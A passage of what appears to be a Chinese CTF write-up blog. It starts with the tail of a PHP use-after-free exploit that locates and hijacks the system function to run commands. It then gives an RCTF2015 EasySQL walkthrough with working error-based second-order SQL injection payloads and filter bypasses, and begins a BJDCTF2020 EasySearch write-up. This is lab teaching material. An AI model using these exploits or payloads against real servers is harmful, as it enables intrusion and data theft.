0x%x&quot;</span>, <span class="hljs-variable">$helper_handlers</span>);<br><br>        <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">prepare_leaker</span>();<br><br>        <span class="hljs-variable">$binary_leak</span> = <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">read</span>(<span class="hljs-variable">$helper_handlers</span> + <span class="hljs-number">8</span>);<br>        <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">log</span>(<span class="hljs-string">&quot;binary leak @ 0x%x&quot;</span>, <span class="hljs-variable">$binary_leak</span>);<br>        <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">prepare_cleanup</span>(<span class="hljs-variable">$binary_leak</span>);<br><br>        <span class="hljs-variable">$closure_addr</span> = <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">str2ptr</span>(<span class="hljs-variable">$this</span>-&gt;helper_off + <span class="hljs-number">0x38</span>);<br>        <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">log</span>(<span class="hljs-string">&quot;real closure @ 0x%x&quot;</span>, <span class="hljs-variable">$closure_addr</span>);<br><br>        <span class="hljs-variable">$closure_ce</span> = <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">read</span>(<span class="hljs-variable">$closure_addr</span> + <span class="hljs-number">0x10</span>);<br>        <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">log</span>(<span class="hljs-string">&quot;closure class_entry @ 0x%x&quot;</span>, <span class="hljs-variable">$closure_ce</span>);<br><br>        <span class="hljs-variable">$basic_funcs</span> = <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">get_basic_funcs</span>(<span class="hljs-variable">$closure_ce</span>);<br>        <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">log</span>(<span class="hljs-string">&quot;basic_functions @ 0x%x&quot;</span>, <span class="hljs-variable">$basic_funcs</span>);<br><br>        <span class="hljs-variable">$zif_system</span> = <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">get_system</span>(<span class="hljs-variable">$basic_funcs</span>);<br>        <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">log</span>(<span class="hljs-string">&quot;zif_system @ 0x%x&quot;</span>, <span class="hljs-variable">$zif_system</span>);<br><br>        <span class="hljs-variable">$fake_closure_off</span> = <span class="hljs-variable language_">$this</span>-&gt;helper_off + CHUNK_SIZE * <span class="hljs-number">2</span>;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> &lt; <span class="hljs-number">0x138</span>; <span class="hljs-variable">$i</span> += <span class="hljs-number">8</span>) &#123;<br>            <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">write</span>(<span class="hljs-variable">$fake_closure_off</span> + <span class="hljs-variable">$i</span>, <span class="hljs-variable">$this</span>-&gt;<span class="hljs-title function_ invoke__">read</span>(<span class="hljs-variable">$closure_addr</span> + <span class="hljs-variable">$i</span>));<br>        &#125;<br>        <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">write</span>(<span class="hljs-variable">$fake_closure_off</span> + <span class="hljs-number">0x38</span>, <span class="hljs-number">1</span>, <span class="hljs-number">4</span>);<br><br>        <span class="hljs-variable">$handler_offset</span> = PHP_MAJOR_VERSION === <span class="hljs-number">8</span> ? <span class="hljs-number">0x70</span> : <span class="hljs-number">0x68</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">write</span>(<span class="hljs-variable">$fake_closure_off</span> + <span class="hljs-variable">$handler_offset</span>, <span class="hljs-variable">$zif_system</span>);<br><br>        <span class="hljs-variable">$fake_closure_addr</span> = <span class="hljs-variable language_">$this</span>-&gt;helper_addr + <span class="hljs-variable">$fake_closure_off</span> - <span class="hljs-variable language_">$this</span>-&gt;helper_off;<br>        <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">write</span>(<span class="hljs-variable">$this</span>-&gt;helper_off + <span class="hljs-number">0x38</span>, <span class="hljs-variable">$fake_closure_addr</span>);<br>        <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">log</span>(<span class="hljs-string">&quot;fake closure @ 0x%x&quot;</span>, <span class="hljs-variable">$fake_closure_addr</span>);<br><br>        <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">cleanup</span>();<br>        (<span class="hljs-variable language_">$this</span>-&gt;helper-&gt;b)(CMD);<br>    &#125;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">make_uaf_obj</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;uafp = <span class="hljs-title function_ invoke__">fopen</span>(<span class="hljs-string">&#x27;php://memory&#x27;</span>, <span class="hljs-string">&#x27;w&#x27;</span>);<br>        <span class="hljs-title function_ invoke__">fwrite</span>(<span class="hljs-variable">$this</span>-&gt;uafp, <span class="hljs-title function_ invoke__">pack</span>(<span class="hljs-string">&#x27;QQQ&#x27;</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0xDEADBAADC0DE</span>));<br>        <span class="hljs-keyword">for</span>(<span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> &lt; STRING_SIZE; <span class="hljs-variable">$i</span>++) &#123;<br>            <span class="hljs-title function_ invoke__">fwrite</span>(<span class="hljs-variable">$this</span>-&gt;uafp, <span class="hljs-string">&quot;\x00&quot;</span>);<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">prepare_leaker</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-variable">$str_off</span> = <span class="hljs-variable language_">$this</span>-&gt;helper_off + CHUNK_SIZE + <span class="hljs-number">8</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">write</span>(<span class="hljs-variable">$str_off</span>, <span class="hljs-number">2</span>);<br>        <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">write</span>(<span class="hljs-variable">$str_off</span> + <span class="hljs-number">0x10</span>, <span class="hljs-number">6</span>);<br><br>        <span class="hljs-variable">$val_off</span> = <span class="hljs-variable language_">$this</span>-&gt;helper_off + <span class="hljs-number">0x48</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">write</span>(<span class="hljs-variable">$val_off</span>, <span class="hljs-variable">$this</span>-&gt;helper_addr + CHUNK_SIZE + <span class="hljs-number">8</span>);<br>        <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">write</span>(<span class="hljs-variable">$val_off</span> + <span class="hljs-number">8</span>, <span class="hljs-number">0xA</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">prepare_cleanup</span>(<span class="hljs-params"><span class="hljs-variable">$binary_leak</span></span>) </span>&#123;<br>        <span class="hljs-variable">$ret_gadget</span> = <span class="hljs-variable">$binary_leak</span>;<br>        <span class="hljs-keyword">do</span> &#123;<br>            --<span class="hljs-variable">$ret_gadget</span>;<br>        &#125; <span class="hljs-keyword">while</span>(<span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">read</span>(<span class="hljs-variable">$ret_gadget</span>, <span class="hljs-number">1</span>) !== <span class="hljs-number">0xC3</span>);<br>        <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">log</span>(<span class="hljs-string">&quot;ret gadget = 0x%x&quot;</span>, <span class="hljs-variable">$ret_gadget</span>);<br>        <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">write</span>(<span class="hljs-number">0</span>, <span class="hljs-variable">$this</span>-&gt;abc_addr + <span class="hljs-number">0x20</span> - (PHP_MAJOR_VERSION === <span class="hljs-number">8</span> ? <span class="hljs-number">0x50</span> : <span class="hljs-number">0x60</span>));<br>        <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">write</span>(<span class="hljs-number">8</span>, <span class="hljs-variable">$ret_gadget</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">read</span>(<span class="hljs-params"><span class="hljs-variable">$addr</span>, <span class="hljs-variable">$n</span> = <span class="hljs-number">8</span></span>) </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">write</span>(<span class="hljs-variable">$this</span>-&gt;helper_off + CHUNK_SIZE + <span class="hljs-number">16</span>, <span class="hljs-variable">$addr</span> - <span class="hljs-number">0x10</span>);<br>        <span class="hljs-variable">$value</span> = <span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$this</span>-&gt;helper-&gt;c);<br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable">$n</span> !== <span class="hljs-number">8</span>) &#123; <span class="hljs-variable">$value</span> &amp;= (<span class="hljs-number">1</span> &lt;&lt; (<span class="hljs-variable">$n</span> &lt;&lt; <span class="hljs-number">3</span>)) - <span class="hljs-number">1</span>; &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable">$value</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">write</span>(<span class="hljs-params"><span class="hljs-variable">$p</span>, <span class="hljs-variable">$v</span>, <span class="hljs-variable">$n</span> = <span class="hljs-number">8</span></span>) </span>&#123;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> &lt; <span class="hljs-variable">$n</span>; <span class="hljs-variable">$i</span>++) &#123;<br>            <span class="hljs-variable language_">$this</span>-&gt;abc[<span class="hljs-variable">$p</span> + <span class="hljs-variable">$i</span>] = <span class="hljs-title function_ invoke__">chr</span>(<span class="hljs-variable">$v</span> &amp; <span class="hljs-number">0xff</span>);<br>            <span class="hljs-variable">$v</span> &gt;&gt;= <span class="hljs-number">8</span>;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">get_basic_funcs</span>(<span class="hljs-params"><span class="hljs-variable">$addr</span></span>) </span>&#123;<br>        <span class="hljs-keyword">while</span>(<span class="hljs-literal">true</span>) &#123;<br>            <span class="hljs-comment">// In rare instances the standard module might lie after the addr we&#x27;re starting</span><br>            <span class="hljs-comment">// the search from. This will result in a SIGSGV when the search reaches an unmapped page.</span><br>            <span class="hljs-comment">// In that case, changing the direction of the search should fix the crash.</span><br>            <span class="hljs-comment">// $addr += 0x10;</span><br>            <span class="hljs-variable">$addr</span> -= <span class="hljs-number">0x10</span>;<br>            <span class="hljs-keyword">if</span>(<span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">read</span>(<span class="hljs-variable">$addr</span>, <span class="hljs-number">4</span>) === <span class="hljs-number">0xA8</span> &amp;&amp;<br>                <span class="hljs-title function_ invoke__">in_array</span>(<span class="hljs-variable">$this</span>-&gt;<span class="hljs-title function_ invoke__">read</span>(<span class="hljs-variable">$addr</span> + <span class="hljs-number">4</span>, <span class="hljs-number">4</span>),<br>                    [<span class="hljs-number">20151012</span>, <span class="hljs-number">20160303</span>, <span class="hljs-number">20170718</span>, <span class="hljs-number">20180731</span>, <span class="hljs-number">20190902</span>, <span class="hljs-number">20200930</span>])) &#123;<br>                <span class="hljs-variable">$module_name_addr</span> = <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">read</span>(<span class="hljs-variable">$addr</span> + <span class="hljs-number">0x20</span>);<br>                <span class="hljs-variable">$module_name</span> = <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">read</span>(<span class="hljs-variable">$module_name_addr</span>);<br>                <span class="hljs-keyword">if</span>(<span class="hljs-variable">$module_name</span> === <span class="hljs-number">0x647261646e617473</span>) &#123;<br>                    <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">log</span>(<span class="hljs-string">&quot;standard module @ 0x%x&quot;</span>, <span class="hljs-variable">$addr</span>);<br>                    <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">read</span>(<span class="hljs-variable">$addr</span> + <span class="hljs-number">0x28</span>);<br>                &#125;<br>            &#125;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">get_system</span>(<span class="hljs-params"><span class="hljs-variable">$basic_funcs</span></span>) </span>&#123;<br>        <span class="hljs-variable">$addr</span> = <span class="hljs-variable">$basic_funcs</span>;<br>        <span class="hljs-keyword">do</span> &#123;<br>            <span class="hljs-variable">$f_entry</span> = <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">read</span>(<span class="hljs-variable">$addr</span>);<br>            <span class="hljs-variable">$f_name</span> = <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">read</span>(<span class="hljs-variable">$f_entry</span>, <span class="hljs-number">6</span>);<br>            <span class="hljs-keyword">if</span>(<span class="hljs-variable">$f_name</span> === <span class="hljs-number">0x6d6574737973</span>) &#123;<br>                <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">read</span>(<span class="hljs-variable">$addr</span> + <span class="hljs-number">8</span>);<br>            &#125;<br>            <span class="hljs-variable">$addr</span> += <span class="hljs-number">0x20</span>;<br>        &#125; <span class="hljs-keyword">while</span>(<span class="hljs-variable">$f_entry</span> !== <span class="hljs-number">0</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">cleanup</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;hfp = <span class="hljs-title function_ invoke__">fopen</span>(<span class="hljs-string">&#x27;php://memory&#x27;</span>, <span class="hljs-string">&#x27;w&#x27;</span>);<br>        <span class="hljs-title function_ invoke__">fwrite</span>(<span class="hljs-variable">$this</span>-&gt;hfp, <span class="hljs-title function_ invoke__">pack</span>(<span class="hljs-string">&#x27;QQ&#x27;</span>, <span class="hljs-number">0</span>, <span class="hljs-variable">$this</span>-&gt;abc_addr));<br>        <span class="hljs-keyword">for</span>(<span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> &lt; FILTER_SIZE - <span class="hljs-number">0x10</span>; <span class="hljs-variable">$i</span>++) &#123;<br>            <span class="hljs-title function_ invoke__">fwrite</span>(<span class="hljs-variable">$this</span>-&gt;hfp, <span class="hljs-string">&quot;\x00&quot;</span>);<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">str2ptr</span>(<span class="hljs-params"><span class="hljs-variable">$p</span> = <span class="hljs-number">0</span>, <span class="hljs-variable">$n</span> = <span class="hljs-number">8</span></span>) </span>&#123;<br>        <span class="hljs-variable">$address</span> = <span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-variable">$j</span> = <span class="hljs-variable">$n</span> - <span class="hljs-number">1</span>; <span class="hljs-variable">$j</span> &gt;= <span class="hljs-number">0</span>; <span class="hljs-variable">$j</span>--) &#123;<br>            <span class="hljs-variable">$address</span> &lt;&lt;= <span class="hljs-number">8</span>;<br>            <span class="hljs-variable">$address</span> |= <span class="hljs-title function_ invoke__">ord</span>(<span class="hljs-variable">$this</span>-&gt;abc[<span class="hljs-variable">$p</span> + <span class="hljs-variable">$j</span>]);<br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable">$address</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">ptr2str</span>(<span class="hljs-params"><span class="hljs-variable">$ptr</span>, <span class="hljs-variable">$n</span> = <span class="hljs-number">8</span></span>) </span>&#123;<br>        <span class="hljs-variable">$out</span> = <span class="hljs-string">&#x27;&#x27;</span>;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> &lt; <span class="hljs-variable">$n</span>; <span class="hljs-variable">$i</span>++) &#123;<br>            <span class="hljs-variable">$out</span> .= <span class="hljs-title function_ invoke__">chr</span>(<span class="hljs-variable">$ptr</span> &amp; <span class="hljs-number">0xff</span>);<br>            <span class="hljs-variable">$ptr</span> &gt;&gt;= <span class="hljs-number">8</span>;<br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable">$out</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">log</span>(<span class="hljs-params"><span class="hljs-variable">$format</span>, <span class="hljs-variable">$val</span> = <span class="hljs-string">&#x27;&#x27;</span></span>) </span>&#123;<br>        <span class="hljs-keyword">if</span>(LOGGING) &#123;<br>            <span class="hljs-title function_ invoke__">printf</span>(<span class="hljs-string">&quot;<span class="hljs-subst">&#123;$format&#125;</span>\n&quot;</span>, <span class="hljs-variable">$val</span>);<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-built_in">static</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">alloc</span>(<span class="hljs-params"><span class="hljs-variable">$size</span></span>) </span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">str_shuffle</span>(<span class="hljs-title function_ invoke__">str_repeat</span>(<span class="hljs-string">&#x27;A&#x27;</span>, <span class="hljs-variable">$size</span>));<br>    &#125;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/leekosss/photoBed/master/202304151308401.png" alt="image-20230415130831285"></p><p>访问该文件，得到flag</p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
    </categories>
    
    
    <tags>
      
      <tag>EasyThinking</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>EasySQL</title>
    <link href="/2023/08/24/EasySQL/"/>
    <url>/2023/08/24/EasySQL/</url>
    
    <content type="html"><![CDATA[<h2 id="RCTF2015-EasySQL"><a href="#RCTF2015-EasySQL" class="headerlink" title="[RCTF2015]EasySQL"></a>[RCTF2015]EasySQL</h2><p>打开后发现一个登录注册页面，我们先注册一个：</p><p><img src="https://s2.loli.net/2023/03/30/oMly2N1LC5k38hj.png" alt="image-20230330203914744"></p><p>我们发现有一个改密码的地方：</p><p><img src="https://s2.loli.net/2023/03/30/3y7OQ2qGdJZcAvz.png" alt="image-20230330203941627"></p><p>因为这题提示sql，并且注册时存在一些特殊字符不给注册，我们猜测这应该是二次注入</p><p>我们注册一个账号：</p><p><img src="https://s2.loli.net/2023/03/30/QeEHuIWyPvkUx6V.png" alt="image-20230330204129383"></p><p>当我们修改密码时：</p><p><img src="https://s2.loli.net/2023/03/30/5yLxPnNhBIWYAzH.png" alt="image-20230330204223055"></p><p>发现报错了，于是我们推测，sql语句如下：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> <span class="hljs-keyword">table</span> <span class="hljs-keyword">where</span> username<span class="hljs-operator">=</span>&quot;1&quot;&quot; and pwd = &#x27;202cb962ac59075b964b07152d234b70&#x27;<br></code></pre></td></tr></table></figure><p>所以我们需要注册时，在用户名处进行sql注入，然后修改密码时报错回显。我们应该使用报错注入</p><p>经过测试，空格等被过滤了。我们需要绕过，可以使用()、||</p><p>查询表名：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">&quot;||extractvalue(1,concat(0x7e,(select(group_concat(table_name))from(information_schema.tables)where(table_schema=database())),0x7e))#<br></code></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2023/03/30/Xh6fPLtK9Hkd1WI.png" alt="image-20230330210235007"></p><p>查询字段名：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">&quot;||extractvalue(1,concat(0x7e,(select(group_concat(column_name))from(information_schema.columns)where(table_name=&#x27;flag&#x27;)),0x7e))#<br></code></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2023/03/30/VGJ1mKYNugzQp7n.png" alt="image-20230330210347837"></p><p>查询数据：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">&quot;||extractvalue(1,concat(0x7e,(select(group_concat(flag))from(flag)),0x7e))#<br></code></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2023/03/30/8ZVyCAoR4XfHJQr.png" alt="image-20230330210525752"></p><p>查询出来了一部分，但是没有显示完全，并且说flag不在这里，</p><p>于是我们查询users表</p><p>查字段：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">&quot;||extractvalue(1,concat(0x7e,(select(group_concat(column_name))from(information_schema.columns)where(table_name=&#x27;users&#x27;)),0x7e))#<br></code></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2023/03/30/ZmEIkTgtzr4OhpV.png" alt="image-20230330211039997"></p><p>我们想查看完整字段，但是过滤了：left、right、mid函数</p><p>我们可以使用正则匹配：（不能使用like，被过滤了）</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">&quot;||extractvalue(1,concat(0x7e,(select(group_concat(column_name))from(information_schema.columns)where(table_name=&#x27;users&#x27;)&amp;&amp;((column_name)regexp(&#x27;^re&#x27;))),0x7e))#<br></code></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2023/03/30/WsHr84xCuObweoE.png" alt="image-20230330211613972"></p><p>查看到字段名：<code>real_flag_1s_here</code></p><p>然后我们去查数据：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">&quot;||extractvalue(1,concat(0x7e,(select(group_concat(real_flag_1s_here))from(users)),0x7e))#<br></code></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2023/03/30/UsF14vo9EBkK8Jf.png" alt="image-20230330212218279"></p><p>查到一堆乱七八糟的，我们还是使用正则：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">&quot;||extractvalue(1,concat(0x7e,(select(group_concat(real_flag_1s_here))from(users)where(real_flag_1s_here)regexp(&#x27;^f&#x27;)),0x7e))#<br></code></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2023/03/30/8O9Ka2csA41tQkd.png" alt="image-20230330212335501"></p><p>只查到一部分，怎么查另一半呢？这里使用一个函数：<code>reverse()</code></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">&quot;||extractvalue(1,concat(0x7e,reverse((select(group_concat(real_flag_1s_here))from(users)where(real_flag_1s_here)regexp(&#x27;^f&#x27;))),0x7e))#<br></code></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2023/03/30/Jj2ytAVzKxf5uPN.png" alt="image-20230330212800205"></p><p>成功查到另一半</p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
    </categories>
    
    
    <tags>
      
      <tag>EasySQL</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>EasySearch</title>
    <link href="/2023/08/24/EasySearch/"/>
    <url>/2023/08/24/EasySearch/</url>
    
    <content type="html"><![CDATA[<h2 id="BJDCTF2020-EasySearch"><a href="#BJDCTF2020-EasySearch" class="headerlink" title="[BJDCTF2020]EasySearch"></a>[BJDCTF2020]EasySearch</h2><p>打开题目，没什么思路，我们就使用<code>dirsearch</code>扫一下目录</p><p>发现了 <code>index.php.swp</code> 里面存在源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">ob_start</span>();<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">get_hash</span>(<span class="hljs-params"></span>)</span>&#123;<br><span class="hljs-variable">$chars</span> = <span class="hljs-string">&#x27;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789!@#$%^&amp;*()+-&#x27;</span>;<br><span class="hljs-variable">$random</span> = <span class="hljs-variable">$chars</span>[<span class="hljs-title function_ invoke__">mt_rand</span>(<span class="hljs-number">0</span>,<span class="hljs-number">73</span>)].<span class="hljs-variable">$chars</span>[<span class="hljs-title function_ invoke__">mt_rand</span>(<span class="hljs-number">0</span>,<span class="hljs-number">73</span>)].<span class="hljs-variable">$chars</span>[<span class="hljs-title function_ invoke__">mt_rand</span>(<span class="hljs-number">0</span>,<span class="hljs-number">73</span>)].<span class="hljs-variable">$chars</span>[<span class="hljs-title function_ invoke__">mt_rand</span>(<span class="hljs-number">0</span>,<span class="hljs-number">73</span>)].<span class="hljs-variable">$chars</span>[<span class="hljs-title function_ invoke__">mt_rand</span>(<span class="hljs-number">0</span>,<span class="hljs-number">73</span>)];<span class="hljs-comment">//Random 5 times</span><br><span class="hljs-variable">$content</span> = <span class="hljs-title function_ invoke__">uniqid</span>().<span class="hljs-variable">$random</span>;<br><span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">sha1</span>(<span class="hljs-variable">$content</span>); <br>&#125;<br>    <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&quot;Content-Type: text/html;charset=utf-8&quot;</span>);<br>***<br>    <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;username&#x27;</span>]) <span class="hljs-keyword">and</span> <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;username&#x27;</span>] != <span class="hljs-string">&#x27;&#x27;</span> )<br>    &#123;<br>        <span class="hljs-variable">$admin</span> = <span class="hljs-string">&#x27;6d0bc1&#x27;</span>;<br>        <span class="hljs-keyword">if</span> ( <span class="hljs-variable">$admin</span> == <span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;password&#x27;</span>]),<span class="hljs-number">0</span>,<span class="hljs-number">6</span>)) &#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;script&gt;alert(&#x27;[+] Welcome to manage system&#x27;)&lt;/script&gt;&quot;</span>;<br>            <span class="hljs-variable">$file_shtml</span> = <span class="hljs-string">&quot;public/&quot;</span>.<span class="hljs-title function_ invoke__">get_hash</span>().<span class="hljs-string">&quot;.shtml&quot;</span>;<br>            <span class="hljs-variable">$shtml</span> = <span class="hljs-title function_ invoke__">fopen</span>(<span class="hljs-variable">$file_shtml</span>, <span class="hljs-string">&quot;w&quot;</span>) <span class="hljs-keyword">or</span> <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Unable to open file!&quot;</span>);<br>            <span class="hljs-variable">$text</span> = <span class="hljs-string">&#x27;</span><br><span class="hljs-string">            ***</span><br><span class="hljs-string">            ***</span><br><span class="hljs-string">            &lt;h1&gt;Hello,&#x27;</span>.<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;username&#x27;</span>].<span class="hljs-string">&#x27;&lt;/h1&gt;</span><br><span class="hljs-string">            ***</span><br><span class="hljs-string">***&#x27;</span>;<br>            <span class="hljs-title function_ invoke__">fwrite</span>(<span class="hljs-variable">$shtml</span>,<span class="hljs-variable">$text</span>);<br>            <span class="hljs-title function_ invoke__">fclose</span>(<span class="hljs-variable">$shtml</span>);<br>            ***<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;[!] Header  error ...&quot;</span>;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;script&gt;alert(&#x27;[!] Failed&#x27;)&lt;/script&gt;&quot;</span>;<br>            <br>    &#125;<span class="hljs-keyword">else</span><br>    &#123;<br>***<br>    &#125;<br>***<br><span 